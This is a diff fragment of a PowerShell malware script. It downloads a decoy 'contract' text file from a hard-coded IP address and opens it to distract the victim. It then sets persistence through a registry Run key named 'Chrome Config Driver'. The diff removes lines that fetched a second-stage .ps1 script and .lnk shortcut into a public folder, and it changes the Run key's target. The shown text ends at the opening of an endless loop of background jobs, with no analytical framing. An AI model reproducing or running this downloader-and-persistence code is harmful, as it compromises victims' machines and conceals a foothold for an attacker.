@@ -1,7 +1,5 @@
 $client = new-object System.Net.WebClient;$client.DownloadFile("http://194.15.112.220:8011/dogovor-podryad-stroy.txt", "$env:temp\dogovor-podryad-stroy.txt"); Start-Process "$env:temp\dogovor-podryad-stroy.txt";
-$client = new-object System.Net.WebClient;$client.DownloadFile("http://194.15.112.220:8011/2.ps1", "C:\users\Public\Music\notepad.ps1"); 
-$client = new-object System.Net.WebClient;$client.DownloadFile("http://194.15.112.220:8011/notepad.lnk", "C:\users\Public\Music\notepad.lnk");
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "Chrome Config Driver" /t REG_SZ /F /D "C:\users\Public\Music\notepad.lnk";
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "Chrome Config Driver" /t REG_SZ /F /D "C:\users\Public\Music\pl.lnk";
 while($true){
 	$job=start-job -scriptblock {
 		try{
